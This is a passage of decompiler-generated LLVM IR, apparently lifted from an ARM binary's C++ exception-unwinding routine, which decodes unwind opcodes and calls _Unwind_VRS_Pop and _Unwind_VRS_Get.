  store i32 %v3_31c00, i32* %r2.global-to-local, align 4
  %v1_31c04 = inttoptr i32 %v3_31c00 to i32*
  %v2_31c04 = load i32, i32* %v1_31c04, align 4
  store i32 %v2_31c04, i32* %r0.global-to-local, align 4
  %v4_31c04 = add i32 %v3_31c00, 4
  store i32 %v4_31c04, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_31c04, i32* %v2_31c00, align 4
  %v0_31c10 = load i32, i32* %r3.global-to-local, align 4
  %v1_31c10 = trunc i32 %v0_31c10 to i8
  %v2_31c10 = load i32, i32* @r5, align 4
  %v3_31c10 = add i32 %v2_31c10, 8
  %v4_31c10 = inttoptr i32 %v3_31c10 to i8*
  store i8 %v1_31c10, i8* %v4_31c10, align 1
  %v0_31c14 = load i32, i32* %r0.global-to-local, align 4
  %v1_31c14 = load i32, i32* @r5, align 4
  %v2_31c14 = inttoptr i32 %v1_31c14 to i32*
  store i32 %v0_31c14, i32* %v2_31c14, align 4
  br label %dec_label_pc_31c18

dec_label_pc_31c18:                               ; preds = %.thread30, %dec_label_pc_31bf8
  %v0_31c18 = load i32, i32* %r0.global-to-local, align 4
  %v3_31c18 = udiv i32 %v0_31c18, 16777216
  %v1_31c1c = urem i32 %v3_31c18, 16
  %v3_31c20 = mul i32 %v0_31c18, 256
  store i32 %v3_31c20, i32* %r0.global-to-local, align 4
  %v1_31c24 = add nuw nsw i32 %v1_31c1c, 1
  store i32 %v1_31c24, i32* %r2.global-to-local, align 4
  %v1_31c28 = and i32 %v3_31c18, 240
  store i32 %v1_31c28, i32* %r3.global-to-local, align 4
  %v1_31c2c = load i32, i32* @r5, align 4
  %v2_31c2c = inttoptr i32 %v1_31c2c to i32*
  store i32 %v3_31c20, i32* %v2_31c2c, align 4
  %v0_31c30 = load i32, i32* %r2.global-to-local, align 4
  %v1_31c30 = load i32, i32* %r3.global-to-local, align 4
  %v4_31c30 = mul i32 %v1_31c30, 4096
  %v5_31c30 = or i32 %v4_31c30, %v0_31c30
  br label %dec_label_pc_31c34

dec_label_pc_31c34:                               ; preds = %dec_label_pc_31be4, %dec_label_pc_31c18
  %storemerge132 = phi i32 [ %v5_31c30, %dec_label_pc_31c18 ], [ 720897, %dec_label_pc_31be4 ]
  store i32 %storemerge132, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_31b54

dec_label_pc_31c3c:                               ; preds = %dec_label_pc_31bc8
  %v1_31c3c = and i32 %v0_318ac, 252
  store i32 %v1_31c3c, i32* %r3.global-to-local, align 4
  %v7_31c40 = icmp eq i32 %v1_31c3c, 180
  store i1 %v7_31c40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_31c40, label %.thread44, label %bb157

.thread44:                                        ; preds = %dec_label_pc_31c3c
  %v2_31c44 = urem i32 %v0_318ac, 4
  %v2_31c4c = add nuw nsw i32 %v2_31c44, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_31c58 = or i32 %v2_31c4c, 262144
  store i32 %v2_31c58, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_31b54

bb157:                                            ; preds = %dec_label_pc_31c3c
  %v2_31c48 = urem i32 %v0_31bb8, 8
  %v2_31c50 = add nuw nsw i32 %v2_31c48, 1
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_31c60 = or i32 %v2_31c50, 524288
  store i32 %v2_31c60, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_31b54

dec_label_pc_31c68:                               ; preds = %dec_label_pc_31b78
  %v0_31c68 = load i32, i32* %ip.global-to-local, align 4
  %v7_31c68 = icmp eq i32 %v0_31c68, 198
  store i1 %v7_31c68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_31c68, label %dec_label_pc_31c70, label %dec_label_pc_31a74

dec_label_pc_31c70:                               ; preds = %dec_label_pc_31c68
  %v0_31c70 = load i32, i32* @r5, align 4
  %v1_31c70 = add i32 %v0_31c70, 8
  %v2_31c70 = inttoptr i32 %v1_31c70 to i8*
  %v3_31c70 = load i8, i8* %v2_31c70, align 1
  %v4_31c70 = zext i8 %v3_31c70 to i32
  store i32 %v4_31c70, i32* %r3.global-to-local, align 4
  %v2_31c74 = icmp eq i8 %v3_31c70, 0
  store i1 %v2_31c74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_31c74, label %dec_label_pc_31c84, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_31c70
  %v2_31c78 = add nsw i32 %v4_31c70, -1
  store i32 %v2_31c78, i32* %r3.global-to-local, align 4
  %v2_31c7c = trunc i32 %v2_31c78 to i8
  store i8 %v2_31c7c, i8* %v2_31c70, align 1
  %v0_31c80.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_31c80.pr.pr, label %.thread48.dec_label_pc_31c84_crit_edge, label %dec_label_pc_31cb8

.thread48.dec_label_pc_31c84_crit_edge:           ; preds = %.thread48
  %v0_31c84.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_31c84

dec_label_pc_31c84:                               ; preds = %.thread48.dec_label_pc_31c84_crit_edge, %dec_label_pc_31c70
  %v2_31c9c = phi i32 [ %v0_31c84.pre, %.thread48.dec_label_pc_31c84_crit_edge ], [ %v0_31c70, %dec_label_pc_31c70 ]
  %v1_31c84 = add i32 %v2_31c9c, 9
  %v2_31c84 = inttoptr i32 %v1_31c84 to i8*
  %v3_31c84 = load i8, i8* %v2_31c84, align 1
  %v4_31c84 = zext i8 %v3_31c84 to i32
  store i32 %v4_31c84, i32* %r3.global-to-local, align 4
  %v2_31c88 = icmp eq i8 %v3_31c84, 0
  store i1 %v2_31c88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_31c88, label %dec_label_pc_31cd4, label %dec_label_pc_31c98

dec_label_pc_31c98:                               ; preds = %dec_label_pc_31c84
  %v1_31c98 = add nsw i32 %v4_31c84, -1
  store i32 %v1_31c98, i32* %r3.global-to-local, align 4
  %v1_31c9c = trunc i32 %v1_31c98 to i8
  store i8 %v1_31c9c, i8* %v2_31c84, align 1
  %v0_31ca0 = load i32, i32* @r5, align 4
  %v1_31ca0 = add i32 %v0_31ca0, 4
  %v2_31ca0 = inttoptr i32 %v1_31ca0 to i32*
  %v3_31ca0 = load i32, i32* %v2_31ca0, align 4
  store i32 %v3_31ca0, i32* %r2.global-to-local, align 4
  %v1_31ca4 = inttoptr i32 %v3_31ca0 to i32*
  %v2_31ca4 = load i32, i32* %v1_31ca4, align 4
  store i32 %v2_31ca4, i32* %r0.global-to-local, align 4
  %v4_31ca4 = add i32 %v3_31ca0, 4
  store i32 %v4_31ca4, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_31ca4, i32* %v2_31ca0, align 4
  %v0_31cb0 = load i32, i32* %r3.global-to-local, align 4
  %v1_31cb0 = trunc i32 %v0_31cb0 to i8
  %v2_31cb0 = load i32, i32* @r5, align 4
  %v3_31cb0 = add i32 %v2_31cb0, 8
  %v4_31cb0 = inttoptr i32 %v3_31cb0 to i8*
  store i8 %v1_31cb0, i8* %v4_31cb0, align 1
  %v0_31cb4 = load i32, i32* %r0.global-to-local, align 4
  %v1_31cb4 = load i32, i32* @r5, align 4
  %v2_31cb4 = inttoptr i32 %v1_31cb4 to i32*
  store i32 %v0_31cb4, i32* %v2_31cb4, align 4
  br label %dec_label_pc_31cb8

dec_label_pc_31cb8:                               ; preds = %.thread48, %dec_label_pc_31c98
  %v0_31cb8 = load i32, i32* %r0.global-to-local, align 4
  %v3_31cb8 = udiv i32 %v0_31cb8, 16777216
  %v1_31cbc = urem i32 %v3_31cb8, 16
  %v3_31cc0 = mul i32 %v0_31cb8, 256
  store i32 %v3_31cc0, i32* %r0.global-to-local, align 4
  %v1_31cc4 = add nuw nsw i32 %v1_31cbc, 1
  store i32 %v1_31cc4, i32* %r2.global-to-local, align 4
  %v1_31cc8 = and i32 %v3_31cb8, 240
  store i32 %v1_31cc8, i32* %r3.global-to-local, align 4
  %v1_31ccc = load i32, i32* @r5, align 4
  %v2_31ccc = inttoptr i32 %v1_31ccc to i32*
  store i32 %v3_31cc0, i32* %v2_31ccc, align 4
  %v0_31cd0 = load i32, i32* %r2.global-to-local, align 4
  %v1_31cd0 = load i32, i32* %r3.global-to-local, align 4
  %v4_31cd0 = mul i32 %v1_31cd0, 4096
  %v5_31cd0 = or i32 %v4_31cd0, %v0_31cd0
  br label %dec_label_pc_31cd4

dec_label_pc_31cd4:                               ; preds = %dec_label_pc_31c84, %dec_label_pc_31cb8
  %storemerge131 = phi i32 [ %v5_31cd0, %dec_label_pc_31cb8 ], [ 720897, %dec_label_pc_31c84 ]
  store i32 %storemerge131, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_31b54

dec_label_pc_31cdc:                               ; preds = %dec_label_pc_31a98
  %v0_31cdc = load i32, i32* @r5, align 4
  %v1_31cdc = add i32 %v0_31cdc, 8
  %v2_31cdc = inttoptr i32 %v1_31cdc to i8*
  %v3_31cdc = load i8, i8* %v2_31cdc, align 1
  %v4_31cdc = zext i8 %v3_31cdc to i32
  store i32 %v4_31cdc, i32* %r3.global-to-local, align 4
  %v2_31ce0 = icmp eq i8 %v3_31cdc, 0
  store i1 %v2_31ce0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_31ce0, label %dec_label_pc_31cf0, label %.thread52

.thread52:                                        ; preds = %dec_label_pc_31cdc
  %v2_31ce4 = add nsw i32 %v4_31cdc, -1
  store i32 %v2_31ce4, i32* %r3.global-to-local, align 4
  %v2_31ce8 = trunc i32 %v2_31ce4 to i8
  store i8 %v2_31ce8, i8* %v2_31cdc, align 1
  %v0_31cec.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_31cec.pr.pr, label %.thread52.dec_label_pc_31cf0_crit_edge, label %dec_label_pc_31d24

.thread52.dec_label_pc_31cf0_crit_edge:           ; preds = %.thread52
  %v0_31cf0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_31cf0

dec_label_pc_31cf0:                               ; preds = %.thread52.dec_label_pc_31cf0_crit_edge, %dec_label_pc_31cdc
  %v2_31d08 = phi i32 [ %v0_31cf0.pre, %.thread52.dec_label_pc_31cf0_crit_edge ], [ %v0_31cdc, %dec_label_pc_31cdc ]
  %v1_31cf0 = add i32 %v2_31d08, 9
  %v2_31cf0 = inttoptr i32 %v1_31cf0 to i8*
  %v3_31cf0 = load i8, i8* %v2_31cf0, align 1
  %v4_31cf0 = zext i8 %v3_31cf0 to i32
  store i32 %v4_31cf0, i32* %r3.global-to-local, align 4
  %v2_31cf4 = icmp eq i8 %v3_31cf0, 0
  store i1 %v2_31cf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_31cf4, label %dec_label_pc_31d40, label %dec_label_pc_31d04

dec_label_pc_31d04:                               ; preds = %dec_label_pc_31cf0
  %v1_31d04 = add nsw i32 %v4_31cf0, -1
  store i32 %v1_31d04, i32* %r3.global-to-local, align 4
  %v1_31d08 = trunc i32 %v1_31d04 to i8
  store i8 %v1_31d08, i8* %v2_31cf0, align 1
  %v0_31d0c = load i32, i32* @r5, align 4
  %v1_31d0c = add i32 %v0_31d0c, 4
  %v2_31d0c = inttoptr i32 %v1_31d0c to i32*
  %v3_31d0c = load i32, i32* %v2_31d0c, align 4
  store i32 %v3_31d0c, i32* %r2.global-to-local, align 4
  %v1_31d10 = inttoptr i32 %v3_31d0c to i32*
  %v2_31d10 = load i32, i32* %v1_31d10, align 4
  store i32 %v2_31d10, i32* %r0.global-to-local, align 4
  %v4_31d10 = add i32 %v3_31d0c, 4
  store i32 %v4_31d10, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_31d10, i32* %v2_31d0c, align 4
  %v0_31d1c = load i32, i32* %r3.global-to-local, align 4
  %v1_31d1c = trunc i32 %v0_31d1c to i8
  %v2_31d1c = load i32, i32* @r5, align 4
  %v3_31d1c = add i32 %v2_31d1c, 8
  %v4_31d1c = inttoptr i32 %v3_31d1c to i8*
  store i8 %v1_31d1c, i8* %v4_31d1c, align 1
  %v0_31d20 = load i32, i32* %r0.global-to-local, align 4
  %v1_31d20 = load i32, i32* @r5, align 4
  %v2_31d20 = inttoptr i32 %v1_31d20 to i32*
  store i32 %v0_31d20, i32* %v2_31d20, align 4
  br label %dec_label_pc_31d24

dec_label_pc_31d24:                               ; preds = %.thread52, %dec_label_pc_31d04
  %v0_31d24 = load i32, i32* %r0.global-to-local, align 4
  %v3_31d24 = udiv i32 %v0_31d24, 16777216
  %v1_31d28 = urem i32 %v3_31d24, 16
  %v3_31d2c = mul i32 %v0_31d24, 256
  store i32 %v3_31d2c, i32* %r0.global-to-local, align 4
  %v1_31d30 = add nuw nsw i32 %v1_31d28, 1
  store i32 %v1_31d30, i32* %r2.global-to-local, align 4
  %v1_31d34 = and i32 %v3_31d24, 240
  store i32 %v1_31d34, i32* %r3.global-to-local, align 4
  %v1_31d38 = load i32, i32* @r5, align 4
  %v2_31d38 = inttoptr i32 %v1_31d38 to i32*
  store i32 %v3_31d2c, i32* %v2_31d38, align 4
  %v0_31d3c = load i32, i32* %r2.global-to-local, align 4
  %v1_31d3c = load i32, i32* %r3.global-to-local, align 4
  %v4_31d3c = mul i32 %v1_31d3c, 4096
  %v5_31d3c = or i32 %v4_31d3c, %v0_31d3c
  br label %dec_label_pc_31d40

dec_label_pc_31d40:                               ; preds = %dec_label_pc_31cf0, %dec_label_pc_31d24
  %storemerge130 = phi i32 [ %v5_31d3c, %dec_label_pc_31d24 ], [ 720897, %dec_label_pc_31cf0 ]
  store i32 %storemerge130, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_31b54

dec_label_pc_31d48:                               ; preds = %dec_label_pc_31a74
  %v0_31d48 = load i32, i32* @r5, align 4
  %v1_31d48 = add i32 %v0_31d48, 8
  %v2_31d48 = inttoptr i32 %v1_31d48 to i8*
  %v3_31d48 = load i8, i8* %v2_31d48, align 1
  %v4_31d48 = zext i8 %v3_31d48 to i32
  store i32 %v4_31d48, i32* %r3.global-to-local, align 4
  %v2_31d4c = icmp eq i8 %v3_31d48, 0
  store i1 %v2_31d4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_31d4c, label %dec_label_pc_31ef4, label %.thread56

.thread56:                                        ; preds = %dec_label_pc_31d48
  %v2_31d50 = add nsw i32 %v4_31d48, -1
  store i32 %v2_31d50, i32* %r3.global-to-local, align 4
  %v2_31d54 = trunc i32 %v2_31d50 to i8
  store i8 %v2_31d54, i8* %v2_31d48, align 1
  %v0_31d58.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_31d58.pr.pr, label %.thread56.dec_label_pc_31ef4_crit_edge, label %dec_label_pc_31d5c

.thread56.dec_label_pc_31ef4_crit_edge:           ; preds = %.thread56
  %v0_31ef4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_31ef4

dec_label_pc_31d5c:                               ; preds = %.thread56, %dec_label_pc_31f00
  %v0_31d5c = load i32, i32* %r0.global-to-local, align 4
  %v3_31d5c = udiv i32 %v0_31d5c, 16777216
  store i32 %v3_31d5c, i32* %r3.global-to-local, align 4
  store i32 %v3_31d5c, i32* %r2.global-to-local, align 4
  %tmp184 = icmp ult i32 %v0_31d5c, 16777216
  store i1 %tmp184, i1* %cpsr_z.global-to-local, align 1
  %v3_31d64 = mul i32 %v0_31d5c, 256
  store i32 %v3_31d64, i32* %r0.global-to-local, align 4
  %v1_31d68 = load i32, i32* @r5, align 4
  %v2_31d68 = inttoptr i32 %v1_31d68 to i32*
  store i32 %v3_31d64, i32* %v2_31d68, align 4
  br i1 %tmp184, label %dec_label_pc_31b24, label %dec_label_pc_31d70

dec_label_pc_31d70:                               ; preds = %dec_label_pc_31d5c
  %v0_31d70 = load i32, i32* %r3.global-to-local, align 4
  %v1_31d70 = and i32 %v0_31d70, 240
  store i32 %v1_31d70, i32* %r3.global-to-local, align 4
  %v2_31d70 = icmp eq i32 %v1_31d70, 0
  store i1 %v2_31d70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_31d70, label %dec_label_pc_31d78, label %dec_label_pc_31b24

dec_label_pc_31d78:                               ; preds = %dec_label_pc_31d70
  %v0_31d78 = load i32, i32* @r7, align 4
  store i32 %v0_31d78, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_31d80 = load i32, i32* %r2.global-to-local, align 4
  %v4_31d80 = call i32 @_Unwind_VRS_Pop(i32 %v0_31d78, i32 4, i32 %v2_31d80, i32 0)
  store i32 %v4_31d80, i32* %r0.global-to-local, align 4
  %v2_31d84 = icmp eq i32 %v4_31d80, 0
  store i1 %v2_31d84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_31d84, label %dec_label_pc_31854.backedge, label %dec_label_pc_31d8c

dec_label_pc_31d8c:                               ; preds = %dec_label_pc_31d78
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_3197c

dec_label_pc_31d94:                               ; preds = %dec_label_pc_31bc0
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_31da0 = load i32, i32* @r7, align 4
  store i32 %v0_31da0, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_31dac = call i32 @_Unwind_VRS_Get(i32 %v0_31da0, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_31dac, i32* %r0.global-to-local, align 4
  %v0_31db0 = load i32, i32* @r5, align 4
  %v1_31db0 = add i32 %v0_31db0, 8
  %v2_31db0 = inttoptr i32 %v1_31db0 to i8*
  %v3_31db0 = load i8, i8* %v2_31db0, align 1
  %v4_31db0 = zext i8 %v3_31db0 to i32
  store i32 %v4_31db0, i32* %r1.global-to-local, align 4
  %v2_31db4 = icmp eq i8 %v3_31db0, 0
  store i1 %v2_31db4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_31db4, label %dec_label_pc_31dc4, label %.thread58

.thread58:                                        ; preds = %dec_label_pc_31d94
  %v2_31db8 = add nsw i32 %v4_31db0, -1
  store i32 %v2_31db8, i32* %r3.global-to-local, align 4
  %v2_31dbc = trunc i32 %v2_31db8 to i8
  store i8 %v2_31dbc, i8* %v2_31db0, align 1
  %v0_31dc0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_31dc0.pr.pr, label %.thread58.dec_label_pc_31dc4_crit_edge, label %dec_label_pc_31df0

.thread58.dec_label_pc_31dc4_crit_edge:           ; preds = %.thread58
  %v0_31dc4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_31dc4

dec_label_pc_31dc4:                               ; preds = %.thread58.dec_label_pc_31dc4_crit_edge, %dec_label_pc_31d94
  %v2_31dd8 = phi i32 [ %v0_31dc4.pre, %.thread58.dec_label_pc_31dc4_crit_edge ], [ %v0_31db0, %dec_label_pc_31d94 ]
  %v1_31dc4 = add i32 %v2_31dd8, 9
  %v2_31dc4 = inttoptr i32 %v1_31dc4 to i8*
  %v3_31dc4 = load i8, i8* %v2_31dc4, align 1
  %v4_31dc4 = zext i8 %v3_31dc4 to i32
  store i32 %v4_31dc4, i32* %r3.global-to-local, align 4
  %v2_31dc8 = icmp eq i8 %v3_31dc4, 0
  store i1 %v2_31dc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_31dc8, label %bb158, label %dec_label_pc_31dd4

bb158:                                            ; preds = %dec_label_pc_31dc4
  %v1_31dcc = load i32, i32* @r6, align 4
  store i32 %v1_31dcc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_31e18

dec_label_pc_31dd4:                               ; preds = %dec_label_pc_31dc4
  %v1_31dd4 = add nsw i32 %v4_31dc4, -1
  store i32 %v1_31dd4, i32* %r3.global-to-local, align 4
  %v1_31dd8 = trunc i32 %v1_31dd4 to i8
  store i8 %v1_31dd8, i8* %v2_31dc4, align 1
  %v0_31ddc = load i32, i32* @r5, align 4
  %v1_31ddc = add i32 %v0_31ddc, 4
  %v2_31ddc = inttoptr i32 %v1_31ddc to i32*
  %v3_31ddc = load i32, i32* %v2_31ddc, align 4
  store i32 %v3_31ddc, i32* %r2.global-to-local, align 4
  %v1_31de0 = inttoptr i32 %v3_31ddc to i32*
  %v2_31de0 = load i32, i32* %v1_31de0, align 4
  store i32 %v2_31de0, i32* %r0.global-to-local, align 4
  %v4_31de0 = add i32 %v3_31ddc, 4
  store i32 %v4_31de0, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_31de8 = inttoptr i32 %v0_31ddc to i32*
  store i32 %v2_31de0, i32* %v1_31de8, align 4
  %v5_31de8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_31de8, i32* %v2_31ddc, align 4
  %v0_31dec = load i32, i32* %r3.global-to-local, align 4
  %v1_31dec = trunc i32 %v0_31dec to i8
  %v2_31dec = load i32, i32* @r5, align 4
  %v3_31dec = add i32 %v2_31dec, 8
  %v4_31dec = inttoptr i32 %v3_31dec to i8*
  store i8 %v1_31dec, i8* %v4_31dec, align 1
  br label %dec_label_pc_31df0

dec_label_pc_31df0:                               ; preds = %.thread58, %dec_label_pc_31dd4
  %v0_31df0 = load i32, i32* @r5, align 4
  %v1_31df0 = inttoptr i32 %v0_31df0 to i32*
  %v2_31df0 = load i32, i32* %v1_31df0, align 4
  store i32 %v2_31df0, i32* %r3.global-to-local, align 4
  %v3_31df4 = mul i32 %v2_31df0, 256
  store i32 %v3_31df4, i32* %r0.global-to-local, align 4
  %v3_31df8 = udiv i32 %v2_31df0, 16777216
  store i32 %v3_31df8, i32* %r2.global-to-local, align 4
  store i32 %v3_31df4, i32* %v1_31df0, align 4
  %v0_31e00 = load i32, i32* %r2.global-to-local, align 4
  %v1_31e00 = and i32 %v0_31e00, 128
  %v2_31e00 = icmp eq i32 %v1_31e00, 0
  store i1 %v2_31e00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_31e00, label %.thread129, label %dec_label_pc_31e14

.thread129:                                       ; preds = %dec_label_pc_31df0
  %v4_31e04 = load i32, i32* %stack_var_-36, align 4
  store i32 %v4_31e04, i32* %ip.global-to-local, align 4
  %v1_31e08 = urem i32 %v0_31e00, 256
  store i32 %v1_31e08, i32* %r2.global-to-local, align 4
  store i32 2, i32* @lr, align 4
  br label %dec_label_pc_31e88

dec_label_pc_31e14:                               ; preds = %dec_label_pc_31df0
  %v1_31e0863 = urem i32 %v0_31e00, 256
  store i32 %v1_31e0863, i32* %r2.global-to-local, align 4
  %v0_31e14 = load i32, i32* @r5, align 4
  %v1_31e14 = add i32 %v0_31e14, 8
  %v2_31e14 = inttoptr i32 %v1_31e14 to i8*
  %v3_31e14 = load i8, i8* %v2_31e14, align 1
  %v4_31e14 = zext i8 %v3_31e14 to i32
  store i32 %v4_31e14, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_31e18

dec_label_pc_31e18:                               ; preds = %bb158, %dec_label_pc_31e14
  %v3_31e3899 = phi i32 [ %v2_31dd8, %bb158 ], [ %v0_31e14, %dec_label_pc_31e14 ]
  %v0_31e2092 = phi i32 [ %v1_31dcc, %bb158 ], [ %v1_31e0863, %dec_label_pc_31e14 ]
  %v3_31e18 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_31e18, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_31e20

dec_label_pc_31e20:                               ; preds = %dec_label_pc_31e20.backedge, %dec_label_pc_31e18
  %v3_31e38 = phi i32 [ %v3_31e38100, %dec_label_pc_31e20.backedge ], [ %v3_31e3899, %dec_label_pc_31e18 ]
  %v0_31e34 = phi i32 [ %v2_31e24.pre, %dec_label_pc_31e20.backedge ], [ 2, %dec_label_pc_31e18 ]
  %v0_31e24 = phi i32 [ %v0_31e24.pre, %dec_label_pc_31e20.backedge ], [ %v3_31e18, %dec_label_pc_31e18 ]
  %v0_31e20 = phi i32 [ %v0_31e2095, %dec_label_pc_31e20.backedge ], [ %v0_31e2092, %dec_label_pc_31e18 ]
  %v1_31e20 = urem i32 %v0_31e20, 128
  %v7_31e24 = shl i32 %v1_31e20, %v0_31e34
  %v8_31e24 = add i32 %v7_31e24, %v0_31e24
  store i32 %v8_31e24, i32* %ip.global-to-local, align 4
  %v0_31e28 = load i32, i32* %r1.global-to-local, align 4
  %v2_31e28 = icmp eq i32 %v0_31e28, 0
  store i1 %v2_31e28, i1* %cpsr_z.global-to-local, align 1
  %v1_31e2c = add i32 %v0_31e28, -1
  store i32 %v1_31e2c, i32* %r3.global-to-local, align 4
  store i32 %v8_31e24, i32* %stack_var_-36, align 4
  %v1_31e34 = add i32 %v0_31e34, 7
  store i32 %v1_31e34, i32* @lr, align 4
  br i1 %v2_31e28, label %dec_label_pc_31e40, label %bb159

bb159:                                            ; preds = %dec_label_pc_31e20
  %v2_31e38 = trunc i32 %v1_31e2c to i8
  %v4_31e38 = add i32 %v3_31e38, 8
  %v5_31e38 = inttoptr i32 %v4_31e38 to i8*
  store i8 %v2_31e38, i8* %v5_31e38, align 1
  %v0_31e3c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_31e3c.pr, label %.dec_label_pc_31e40_crit_edge, label %dec_label_pc_31e6c

.dec_label_pc_31e40_crit_edge:                    ; preds = %bb159
  %v0_31e40.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_31e40

dec_label_pc_31e40:                               ; preds = %.dec_label_pc_31e40_crit_edge, %dec_label_pc_31e20
  %v2_31e58 = phi i32 [ %v0_31e40.pre, %.dec_label_pc_31e40_crit_edge ], [ %v3_31e38, %dec_label_pc_31e20 ]
  %v1_31e40 = add i32 %v2_31e58, 9
  %v2_31e40 = inttoptr i32 %v1_31e40 to i8*
  %v3_31e40 = load i8, i8* %v2_31e40, align 1
  %v4_31e40 = zext i8 %v3_31e40 to i32
  store i32 %v4_31e40, i32* %r3.global-to-local, align 4
  %v2_31e44 = icmp eq i8 %v3_31e40, 0
  store i1 %v2_31e44, i1* %cpsr_z.global-to-local, align 1
  %v1_31e48 = add nsw i32 %v4_31e40, -1
  store i32 %v1_31e48, i32* %r0.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  br i1 %v2_31e44, label %dec_label_pc_31e20.backedge, label %dec_label_pc_31e54

dec_label_pc_31e54:                               ; preds = %dec_label_pc_31e40
  %v1_31e54 = add i32 %v2_31e58, 4
  %v2_31e54 = inttoptr i32 %v1_31e54 to i32*
  %v3_31e54 = load i32, i32* %v2_31e54, align 4
  store i32 %v3_31e54, i32* %r2.global-to-local, align 4
  %v1_31e58 = trunc i32 %v1_31e48 to i8
  store i8 %v1_31e58, i8* %v2_31e40, align 1
  %v0_31e5c = load i32, i32* %r2.global-to-local, align 4
  %v1_31e5c = inttoptr i32 %v0_31e5c to i32*
  %v2_31e5c = load i32, i32* %v1_31e5c, align 4
  store i32 %v2_31e5c, i32* %r0.global-to-local, align 4
  %v4_31e5c = add i32 %v0_31e5c, 4
  store i32 %v4_31e5c, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v2_31e64 = load i32, i32* @r5, align 4
  %v3_31e64 = add i32 %v2_31e64, 8
  %v4_31e64 = inttoptr i32 %v3_31e64 to i8*
  store i8 3, i8* %v4_31e64, align 1
  %v0_31e68 = load i32, i32* @r5, align 4
  %v1_31e68 = inttoptr i32 %v0_31e68 to i32*
  %v2_31e68 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_31e68, i32* %v1_31e68, align 4
  %v3_31e68 = add i32 %v0_31e68, 4
  %v4_31e68 = inttoptr i32 %v3_31e68 to i32*
  %v5_31e68 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_31e68, i32* %v4_31e68, align 4
  br label %dec_label_pc_31e6c

dec_label_pc_31e6c:                               ; preds = %bb159, %dec_label_pc_31e54
  %v0_31e6c = load i32, i32* @r5, align 4
  %v1_31e6c = inttoptr i32 %v0_31e6c to i32*
  %v2_31e6c = load i32, i32* %v1_31e6c, align 4
  store i32 %v2_31e6c, i32* %r3.global-to-local, align 4
  %v3_31e70 = udiv i32 %v2_31e6c, 16777216
  store i32 %v3_31e70, i32* %r2.global-to-local, align 4
  %v1_31e74 = and i32 %v3_31e70, 128
  %v2_31e74 = icmp eq i32 %v1_31e74, 0
  store i1 %v2_31e74, i1* %cpsr_z.global-to-local, align 1
  %v3_31e78 = mul i32 %v2_31e6c, 256
  store i32 %v3_31e78, i32* %r0.global-to-local, align 4
  store i32 %v3_31e78, i32* %v1_31e6c, align 4
  %v0_31e80 = load i32, i32* %r2.global-to-local, align 4
  %v1_31e80 = urem i32 %v0_31e80, 256
  store i32 %v1_31e80, i32* %r2.global-to-local, align 4
  br i1 %v2_31e74, label %dec_label_pc_31e88.loopexit, label %dec_label_pc_31eb4

dec_label_pc_31e88.loopexit:                      ; preds = %dec_label_pc_31e6c
  %v0_31e8c.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_31e90.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_31e88

dec_label_pc_31e88:                               ; preds = %dec_label_pc_31e88.loopexit, %.thread129
  %v2_31e90 = phi i32 [ 2, %.thread129 ], [ %v2_31e90.pre, %dec_label_pc_31e88.loopexit ]
  %v0_31e8c = phi i32 [ %v4_31e04, %.thread129 ], [ %v0_31e8c.pre, %dec_label_pc_31e88.loopexit ]
  %v0_31e88 = phi i32 [ %v1_31e08, %.thread129 ], [ %v1_31e80, %dec_label_pc_31e88.loopexit ]
